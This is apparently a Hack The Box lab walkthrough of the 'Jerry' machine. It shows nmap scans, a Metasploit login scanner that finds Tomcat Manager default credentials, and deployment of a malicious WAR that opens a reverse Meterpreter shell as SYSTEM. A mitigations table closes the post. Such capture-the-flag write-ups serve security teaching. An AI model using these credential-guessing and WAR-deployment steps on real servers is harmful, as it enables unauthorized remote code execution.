---
title: "HTB Walkthrough: Jerry"
date: 2026-06-13
draft: false
description: "Full walkthrough of the Jerry machine from Hack The Box. Easy difficulty, Windows Server 2012 R2. Default credentials on Apache Tomcat Manager, malicious WAR deployment, and direct shell as SYSTEM."
tags: ["HackTheBox", "Windows", "Easy", "Tomcat", "WAR", "DefaultCredentials", "RCE", "Metasploit", "jerry", "writeups"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Walkthrough of **Jerry** on Hack The Box. **Easy** difficulty machine running **Windows Server 2012 R2**. Apache Tomcat 7.0.88 exposed with default credentials in the Manager. We use them to deploy a malicious WAR that delivers remote code execution directly as **NT AUTHORITY\SYSTEM** — no privilege escalation needed.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Windows{{< /badge >}}
{{< badge >}}Easy{{< /badge >}}

---

## 🗺️ Machine Info

| Field          | Detail                                                        |
|----------------|---------------------------------------------------------------|
| **Name**       | Jerry                                                         |
| **OS**         | Windows Server 2012 R2                                        |
| **Difficulty** | Easy                                                          |
| **IP**         | 10.129.136.9                                                  |
| **Techniques** | Default Credentials · Tomcat WAR Deploy · RCE as SYSTEM       |

---

## 1. Reconnaissance

### 1.1 Port Scan

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.136.9
```

```
PORT     STATE SERVICE
8080/tcp open  http-proxy
```

Version scan:

```bash
nmap -sC -sV -p8080 10.129.136.9
```

```
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88
```

*Open ports:*
- `8080` → **Apache Tomcat 7.0.88**

> **💡 Key insight:** Tomcat exposes the **Manager Application** at `/manager/html` — a web admin interface that allows deploying Java applications (`.war` files) directly to the server. Authenticating to the Manager equals RCE.

### 1.2 Tomcat Manager Enumeration

We navigate to `http://10.129.136.9:8080/manager/html`. Access requires HTTP Basic Auth. We test default credentials using the Metasploit module:

```bash
msf6 > use auxiliary/scanner/http/tomcat_mgr_login
msf6 auxiliary(tomcat_mgr_login) > set RHOSTS 10.129.136.9
msf6 auxiliary(tomcat_mgr_login) > set RPORT 8080
msf6 auxiliary(tomcat_mgr_login) > run
```

```
[-] LOGIN FAILED: tomcat:admin    (Incorrect)
[-] LOGIN FAILED: tomcat:manager  (Incorrect)
[-] LOGIN FAILED: tomcat:tomcat   (Incorrect)
[+] LOGIN SUCCESSFUL: tomcat:s3cret
```

> **🔑 Credentials found:** `tomcat:s3cret`. Tomcat default credentials are publicly documented in the project's own repository — it's one of the first checks on any exposed Tomcat installation.

> **💡 Conclusion:** Manager access with default credentials. We can deploy a malicious WAR and get RCE directly.

---

## 2. Exploitation — Malicious WAR Deployment

### 2.1 Vulnerability Analysis

A **WAR (Web Application Archive)** is the standard Java application packaging format for Tomcat. The Manager allows uploading and deploying WARs directly through the web interface. By deploying a WAR containing a JSP with a reverse shell payload, Tomcat extracts it, serves it as a web application, and visiting the URL executes the code in the context of the Tomcat process.

```
Normal flow:    upload legitimate WAR → Tomcat deploys the app → serves the Java app
Malicious flow: upload malicious WAR → Tomcat deploys the shell JSP
                → visiting the URL triggers the JSP → execution as SYSTEM
```

The Tomcat process on this machine runs as the machine account `JERRY$`, which has privileges equivalent to local administrator — direct SYSTEM access with no escalation needed.

### 2.2 Execution

```bash
msf6 > use exploit/multi/http/tomcat_mgr_deploy
msf6 exploit(tomcat_mgr_deploy) > set RHOSTS 10.129.136.9
msf6 exploit(tomcat_mgr_deploy) > set RPORT 8080
msf6 exploit(tomcat_mgr_deploy) > set HttpUsername tomcat
msf6 exploit(tomcat_mgr_deploy) > set HttpPassword s3cret
msf6 exploit(tomcat_mgr_deploy) > set PATH /manager/text
msf6 exploit(tomcat_mgr_deploy) > set LHOST tun0
msf6 exploit(tomcat_mgr_deploy) > set target 1
msf6 exploit(tomcat_mgr_deploy) > run
```

Two relevant configuration options:
- **`PATH /manager/text`** — The `/manager/text` path is the plain-text API that Metasploit uses for programmatic deployment, without parsing HTML.
- **`target 1` (Java Universal)** — Generates a pure Java payload (`.class`) that runs on Tomcat's JVM, compatible with both Windows and Linux regardless of OS architecture.

```
[*] Uploading 6217 bytes as GiLuDM0r7bdIcsQyV.war ...
[*] Executing /GiLuDM0r7bdIcsQyV/UnHl.jsp...
[*] Undeploying GiLuDM0r7bdIcsQyV ...
[*] Meterpreter session 1 opened (10.10.14.211:4444 -> 10.129.136.9:49192)
```

```bash
meterpreter > getuid
Server username: JERRY$
```

✅ **Shell obtained directly as SYSTEM.** No privilege escalation required.

---

## 3. Flags — Two for the Price of One

Jerry has a distinctive quirk: both flags are in a single file on the Administrator's desktop, as a wink from the creator to the fact that SYSTEM is obtained directly without going through an unprivileged user.

```bash
meterpreter > cat "C:\\Users\\Administrator\\Desktop\\flags\\2 for the price of 1.txt"
```

```
user.txt
[flag]
root.txt
[flag]
```

> 🔑 User flag obtained.

> 🏁 Root flag obtained.

---

## 4. Summary and Lessons Learned

**Compromise path:**

1. **Recon** → Port 8080 with Apache Tomcat 7.0.88; Manager Application at `/manager/html`.
2. **Default credentials** → `tomcat_mgr_login` → `tomcat:s3cret`.
3. **Malicious WAR** → `tomcat_mgr_deploy` with Java Universal → JSP executed by Tomcat → shell as `JERRY$` (SYSTEM).
4. **Flags** → Both in a single file on the Administrator's desktop.

**What I learned from this machine:**

- **Tomcat Manager with default credentials is RCE.** No software vulnerability needed — the legitimate WAR deployment functionality is the attack vector. The security of a Tomcat installation depends entirely on protecting the Manager with strong credentials and IP-based access restrictions.

- **Java Universal payloads are OS-architecture agnostic.** Unlike native payloads (`.exe` for Windows, ELF for Linux), a Java payload runs on the JVM regardless of whether the system is x86, x64, Windows, or Linux. On Java application servers this is especially useful because the JVM is always available.

- **The machine account in Windows has local administrator privileges.** `JERRY$` is the system's machine account — not a traditional admin user, but with equivalent access to SYSTEM on the local system. When a service runs under this account, compromising that service grants full access without additional escalation.

- **Changing default credentials is the most basic and most frequently skipped hardening step.** The password `s3cret` isn't even Tomcat's actual default password — someone configured it deliberately. Yet it appears in every Tomcat wordlist. A weak, documented password on the Manager is functionally equivalent to having no password.

**Mitigations:**

| Vector | Mitigation |
|--------|------------|
| Default credentials in Tomcat Manager | Change credentials immediately after installation; use complex, unique passwords |
| Tomcat Manager accessible from the internet | Restrict `/manager` by IP; disable Manager in production if not needed |
| Tomcat running as machine account (SYSTEM) | Create a dedicated service user without administrative privileges to run Tomcat |
| Unrestricted WAR deployment | Disable Manager if not actively used; whitelist of authorized WARs |
| Tomcat 7.0.88 (end of life) | Upgrade to Tomcat 9.x or 10.x with active security patches |
